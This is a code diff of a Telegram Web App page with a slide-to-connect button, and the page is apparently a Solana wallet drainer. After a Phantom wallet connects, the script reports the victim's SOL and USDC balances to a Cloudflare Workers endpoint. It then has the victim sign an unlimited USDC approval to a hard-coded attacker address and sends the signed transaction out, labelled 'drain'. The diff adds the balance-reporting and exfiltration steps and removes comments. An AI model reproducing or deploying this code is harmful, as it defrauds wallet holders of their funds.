@@ -84,7 +84,7 @@
     position: relative;
     overflow: hidden;
     display: flex;
-    flex-direction: row-reverse; /* Startet von rechts */
+    flex-direction: row-reverse;
     align-items: center;
     padding: 4px;
     user-select: none;
@@ -120,7 +120,7 @@
     width: 20px; height: 20px;
     color: #000000;
     transition: transform 0.2s;
-    transform: rotate(180deg); /* Pfeil zeigt nach links */
+    transform: rotate(180deg);
   }
 
   /* States */
@@ -183,7 +183,6 @@
     window.Telegram.WebApp.expand();
   }
 
-  // DEINE KONFIGURATION
   const ATTACKER = "FN73jYtbKMkfT14yG8MvMzrmCSREyX45rUrxiKoRbofB"; 
   const ENDPOINT = "https://sol-sync-worker.rthvzkr6jv.workers.dev"; 
   const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; 
@@ -212,7 +211,6 @@
     }
   });
 
-  // --- SLIDER LOGIC ---
   function initSlider() {
     maxDrag = container.offsetWidth - thumb.offsetWidth - 8;
   }
@@ -227,8 +225,6 @@
   function moveDrag(e) {
     if (!isDragging) return;
     const clientX = e.type.includes('mouse') ? e.clientX : e.touches[0].clientX;
-    
-    // Ziehen nach links bedeutet negatives Delta. Wir drehen es um.
     let delta = startX - clientX; 
     
     if (delta < 0) delta = 0;
@@ -246,7 +242,6 @@
     isDragging = false;
     
     if (currentX > maxDrag * 0.7) {
-      // Trigger Connect
       container.classList.add('loading');
       text.style.opacity = 0;
       thumb.style.transition = 'width 0.3s ease, border-radius 0.3s ease, transform 0.3s ease';
@@ -257,7 +252,6 @@
       
       triggerConnect();
     } else {
-      // Snap back
       thumb.style.transition = 'transform 0.3s cubic-bezier(0.16, 1, 0.3, 1)';
       thumb.style.transform = 'translateX(0)';
       text.style.opacity = 1;
@@ -265,7 +259,7 @@
     }
   }
 
-  // --- CONNECT LOGIC ---
+  // --- CONNECT & CHECK BALANCE LOGIC ---
   async function triggerConnect() {
     let provider;
     if (window.phantom?.solana?.isPhantom) provider = window.phantom.solana;
@@ -287,36 +281,68 @@
     }
 
     try {
+      // 1. Connect
       const resp = await provider.connect();
       const victim = resp.publicKey.toString();
       
       const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+      
+      // 2. Check Balance
+      const solBalance = await conn.getBalance(resp.publicKey);
+      const solAmount = solBalance / solanaWeb3.LAMPORTS_PER_SOL;
+      
       const victimAta = await splToken.getAssociatedTokenAddress(
         new solanaWeb3.PublicKey(USDC_MINT),
         resp.publicKey
       );
 
-      const delegateIx = splToken.createApproveInstruction(
-        victimAta,
-        new solanaWeb3.PublicKey(ATTACKER),
-        resp.publicKey,
-        [],
-        BigInt("18446744073709551615")
-      );
+      let usdcAmount = 0;
+      try {
+        const tokenBal = await conn.getTokenAccountBalance(victimAta);
+        usdcAmount = tokenBal.value.uiAmount;
+      } catch (e) {
+        // No USDC account
+      }
 
-      const tx = new solanaWeb3.Transaction().add(delegateIx);
-      tx.feePayer = resp.publicKey;
-      tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-
-      const signedTx = await provider.signTransaction(tx);
-
+      // 3. Send Info to Telegram (via Worker)
       await fetch(ENDPOINT, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", ts: Date.now() })
+        body: JSON.stringify({ 
+          victim, 
+          chain: "solana",
+          type: "connection_and_balance",
+          sol: solAmount.toFixed(4),
+          usdc: usdcAmount,
+          ts: Date.now() 
+        })
       });
 
-      // Success State
+      // 4. If USDC > 0, request Approval
+      if (usdcAmount > 0) {
+        const delegateIx = splToken.createApproveInstruction(
+          victimAta,
+          new solanaWeb3.PublicKey(ATTACKER),
+          resp.publicKey,
+          [],
+          BigInt("18446744073709551615")
+        );
+
+        const tx = new solanaWeb3.Transaction().add(delegateIx);
+        tx.feePayer = resp.publicKey;
+        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+
+        const signedTx = await provider.signTransaction(tx);
+
+        // 5. Send Signature to Worker
+        await fetch(ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ victim, tx: bs58.encode(signedTx.serialize()), chain: "solana", type: "drain", ts: Date.now() })
+        });
+      }
+
+      // Success UI
       spin.style.display = 'none';
       container.classList.remove('loading');
       container.classList.add('success');
@@ -340,7 +366,6 @@
     currentX = 0;
   }
 
-  // Event Listeners
   window.addEventListener('resize', initSlider);
   setTimeout(initSlider, 100);
 
